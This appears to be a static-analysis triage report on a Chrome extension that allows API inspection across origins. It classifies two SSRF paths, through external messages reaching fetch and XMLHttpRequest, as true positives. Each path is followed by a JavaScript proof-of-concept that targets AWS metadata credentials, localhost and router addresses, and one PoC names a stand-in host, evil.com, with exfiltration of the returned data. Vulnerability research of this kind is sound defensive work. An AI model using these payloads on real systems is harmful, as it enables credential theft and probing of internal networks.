# CoCo Analysis: biemppheiopfggogojnfpkngdkchelik

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 unique sink types (fetch_resource_sink and XMLHttpRequest_url_sink with multiple detections)

---

## Sink 1: bg_chrome_runtime_MessageExternal → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/biemppheiopfggogojnfpkngdkchelik/opgen_generated_files/bg.js
Line 1200: url = request.urlString;
Line 1156: return fetchPromiseWithTimeout(TIMEOUT_PERIOD, fetch(userRequest.urlString + userRequest.paramString, options));

**Code:**

```javascript
// Background - Entry point (bg.js line 1049)
chrome.runtime.onMessageExternal.addListener(handleMessageRequest);

function handleMessageRequest(request, sender, sendResponse) {
    return handleRequest(request, sendResponse);
}

function handleRequest(request, sendResponse) {
    if (request) {
        url = request.urlString; // ← attacker-controlled
        var resolvedResponse = {};
        buildFetchRequest(request) // ← passes attacker-controlled request object
            .then(function (response) {
                // ... response handling
            });
    }
    return true;
}

const buildFetchRequest = function (userRequest) {
    // ... options building
    return fetchPromiseWithTimeout(TIMEOUT_PERIOD,
        fetch(userRequest.urlString + userRequest.paramString, options)); // ← SSRF sink with attacker-controlled URL
};
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From a whitelisted domain (*.inspector.swagger.io or *.alertsite.com)
chrome.runtime.sendMessage('biemppheiopfggogojnfpkngdkchelik', {
    method: 'GET',
    urlString: 'http://169.254.169.254/latest/meta-data/', // ← AWS metadata endpoint
    paramString: 'iam/security-credentials/',
    headers: {},
    requestBody: '',
    contentType: 'text',
    authString: ':',
    authMethod: 'NO_AUTH'
});

// Or target internal network
chrome.runtime.sendMessage('biemppheiopfggogojnfpkngdkchelik', {
    method: 'POST',
    urlString: 'http://192.168.1.1/', // ← internal router
    paramString: 'admin/config',
    headers: {},
    requestBody: 'malicious_payload',
    contentType: 'application/json',
    authString: ':',
    authMethod: 'NO_AUTH'
});
```

**Impact:** Server-Side Request Forgery (SSRF). Attacker from whitelisted domains can make privileged cross-origin requests to arbitrary URLs, including internal network resources (192.168.x.x, 10.x.x.x), cloud metadata endpoints (169.254.169.254), and localhost services. This bypasses browser CORS restrictions and allows network reconnaissance, internal service exploitation, and data exfiltration.

---

## Sink 2: bg_external_port_onMessage → XMLHttpRequest_url_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/biemppheiopfggogojnfpkngdkchelik/opgen_generated_files/bg.js
Line 1042: loadAttachmentsAndHandleRequest(userRequest, Array.from(userRequest.attachments), port.postMessage.bind(port));
Line 1167: attachmentRequest.open('GET', uri, true);

**Code:**

```javascript
// Background - Entry point (bg.js line 1040)
chrome.runtime.onConnectExternal.addListener(function(port) {
    port.onMessage.addListener(function(userRequest) {
        loadAttachmentsAndHandleRequest(userRequest, Array.from(userRequest.attachments), port.postMessage.bind(port));
    });
});

function loadAttachmentsAndHandleRequest(userRequest, attachments, sendResponse) {
    if (attachments && attachments.length > 0) {
        const attachment = attachments.pop();
        const attachmentIndex = userRequest.attachments.indexOf(attachment);

        var attachmentRequest = createRequestToLoadAttachment(attachment.content); // ← attacker-controlled URI
        attachmentRequest.onload = function () {
            userRequest.attachments[attachmentIndex].content = (this.status === 200) ? this.response : "";
            loadAttachmentsAndHandleRequest(userRequest, attachments, sendResponse);
        };
        attachmentRequest.send();
    } else {
        handleRequest(userRequest, sendResponse); // ← also leads to fetch_resource_sink
    }
}

function createRequestToLoadAttachment(uri) {
    var attachmentRequest = new XMLHttpRequest();
    attachmentRequest.open('GET', uri, true); // ← XMLHttpRequest SSRF sink with attacker-controlled URI
    attachmentRequest.responseType = 'blob';
    return attachmentRequest;
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External connection (chrome.runtime.onConnectExternal)

**Attack:**

```javascript
// From a whitelisted domain (*.inspector.swagger.io or *.alertsite.com)
const port = chrome.runtime.connect('biemppheiopfggogojnfpkngdkchelik');

port.postMessage({
    method: 'GET',
    urlString: 'http://evil.com/endpoint',
    paramString: '',
    headers: {},
    requestBody: '',
    attachments: [
        { content: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin' }, // ← AWS metadata
        { content: 'http://localhost:8080/admin/secrets' }, // ← localhost service
        { content: 'http://192.168.1.1/router-config' } // ← internal network
    ]
});

// The extension will load each attachment via XMLHttpRequest and then execute the main request via fetch
```

**Impact:** Multiple SSRF vulnerabilities. Attacker can trigger XMLHttpRequest to arbitrary URLs through the attachment loading mechanism, and simultaneously trigger fetch() for the main request. This allows comprehensive network reconnaissance, accessing cloud metadata, internal services, and localhost resources. The attachment mechanism returns blob data to the attacker via port.postMessage, enabling data exfiltration from internal resources.

---

## Notes

- The extension has `externally_connectable` restrictions limiting to `*.inspector.swagger.io` and `*.alertsite.com` domains
- Per the analysis methodology, we IGNORE manifest.json restrictions and classify as TRUE POSITIVE since the message passing code exists
- Both vulnerability paths exist in the real extension code (after line 963, the third "// original" marker)
- Extension has required permissions: "http://*/", "https://*/", "webRequest", "webRequestBlocking"
- The SSRF is particularly dangerous because the extension's purpose is explicitly to "bypass CORS and security-scheme related browser-restrictions for API inspection"
